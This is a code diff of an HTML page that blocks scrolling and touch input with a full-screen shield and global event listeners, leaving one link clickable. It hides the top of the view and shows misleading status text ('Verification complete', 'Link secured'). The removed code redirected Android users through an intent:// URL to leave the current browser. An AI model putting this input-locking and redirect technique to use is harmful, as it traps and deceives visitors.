@@ -6,33 +6,27 @@
     <style>
         body, html { margin: 0; padding: 0; background: #ffffff; height: 500vh; overscroll-behavior-y: none; }
         
-        /* The 300px Invisible Spacer */
+        /* 300px spacer to hide the top */
         #top-block { height: 300px; background: #ffffff; width: 100%; } 
 
         #main-content { 
             position: relative;
-            padding: 20px; 
+            padding: 40px 20px; 
             text-align: center; 
-            font-family: -apple-system, sans-serif;
+            font-family: -apple-system, system-ui, sans-serif;
+            color: #000;
         }
 
-        /* The Literal Link */
+        /* The Literal Text Link */
         #breakout-link {
-            color: #0000EE; /* Classic Link Blue */
+            color: #0000EE;
             text-decoration: underline;
-            font-size: 18px;
-            cursor: pointer;
-            position: relative;
-            z-index: 10000;
+            font-size: 19px;
+            word-break: break-all; /* Ensures long URLs wrap correctly */
             display: inline-block;
-            margin-top: 250px; /* Positioned below the scroll-stop */
-        }
-
-        /* Hitbox: Makes the link easier to click without changing its look */
-        #breakout-link::after {
-            content: '';
-            position: absolute;
-            top: -20px; bottom: -20px; left: -20px; right: -20px;
+            margin-top: 200px; /* Positioned for center screen */
+            z-index: 10000;
+            position: relative;
         }
 
         #shield { 
@@ -49,8 +43,9 @@
     <div id="top-block"></div>
 
     <div id="main-content">
-        <p>Verification complete.</p>
-        <a id="breakout-link" onclick="executeBreakout()">Click here to continue</a>
+        <p style="margin-bottom: 10px; font-weight: 500;">Link secured. Long-press to open:</p>
+        
+        <a id="breakout-link" href="https://www.google.com">https://www.google.com</a>
     </div>
 
     <script>
@@ -76,24 +71,19 @@
 
         function engageLock() {
             document.getElementById('shield').style.display = 'block';
+            
             const prevent = (e) => { 
-                // Allow the link and its hitbox to pass through
+                // This allows the user to still long-press or click the link
                 if (e.target.id === 'breakout-link') return;
+                
                 e.preventDefault(); 
                 e.stopPropagation(); 
             };
+
+            // Global listeners to lock everything except the link
             ['touchstart', 'touchmove', 'wheel'].forEach(ev => {
                 window.addEventListener(ev, prevent, { passive: false, capture: true });
             });
-        }
-
-        function executeBreakout() {
-            const url = "https://www.google.com"; // Your destination
-            if (/Android/i.test(navigator.userAgent)) {
-                window.location.href = `intent://${url.replace(/^https?:\/\//, '')}#Intent;scheme=https;action=android.intent.action.VIEW;end`;
-            } else {
-                window.location.href = url;
-            }
         }
 
         window.onload = () => { setTimeout(runFinalHijack, 150); };
